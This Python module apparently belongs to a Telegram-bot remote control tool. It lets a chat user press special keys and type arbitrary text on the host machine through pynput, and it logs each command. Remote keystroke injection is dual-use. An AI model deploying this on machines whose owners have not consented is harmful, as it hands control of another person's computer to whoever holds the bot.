#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Import modules
from core.logger import Log
from telebot import types
from pynput.keyboard import Controller, Key  # pip install pynput


special_keys = {
    # Main
    "ESC": Key.esc,
    "TAB": Key.tab,
    "ALT": Key.alt,
    "END": Key.end,
    "CTRL": Key.ctrl,
    "CAPS": Key.caps_lock,
    "ENTER": Key.enter,
    "SHIFT": Key.shift,
    "INSERT": Key.insert,
    "DELETE": Key.delete,
    "COMMAND": Key.cmd,
    "BACKSPACE": Key.backspace,
    # Arrows
    "PAGEDOWN": Key.page_down,
    "UP": Key.up,
    "PAGEUP": Key.page_up,
    "LEFT": Key.left,
    "DOWN": Key.down,
    "RIGHT": Key.right,
    # F1-F12 keys
    "F1": Key.f1,
    "F2": Key.f2,
    "F3": Key.f3,
    "F4": Key.f4,
    "F5": Key.f5,
    "F6": Key.f6,
    "F7": Key.f7,
    "F8": Key.f8,
    "F9": Key.f9,
    "F10": Key.f10,
    "F11": Key.f11,
    "F12": Key.f12,
}

controller = Controller()

def SendKeyPress(key: str, chatid: int) -> None:
    if key in special_keys:
        Log("Keyboard >> Send key press " + key, chatid)
        controller.press(special_keys[key])
        controller.release(special_keys[key])

def SendKeyText(keys: str, chatid: int) -> None:
    Log("Keyboard >> Send text " + keys, chatid)
    return controller.type(keys)

def SendKeyboard(chatid, bot) -> None:
    mk = "SNDKEY_"
    Log("Keyboard >> Send keyboard ", chatid)

    for keys in [
        [*special_keys][0:12],    # Main
        [*special_keys][12:18],   # arrows
        [*special_keys][18:30]]:  # F1-F12
        markup = types.InlineKeyboardMarkup(row_width=3)
        for key in range(1, len(keys), 3):

            k1 = keys[key - 1]
            k2 = keys[key]
            k3 = keys[key + 1]

            markup.add(
                types.InlineKeyboardButton(text=k1, callback_data=mk + k1),
                types.InlineKeyboardButton(text=k2, callback_data=mk + k2),
                types.InlineKeyboardButton(text=k3, callback_data=mk + k3),
            )

        bot.send_message(chatid, "keyboard", reply_markup=markup)


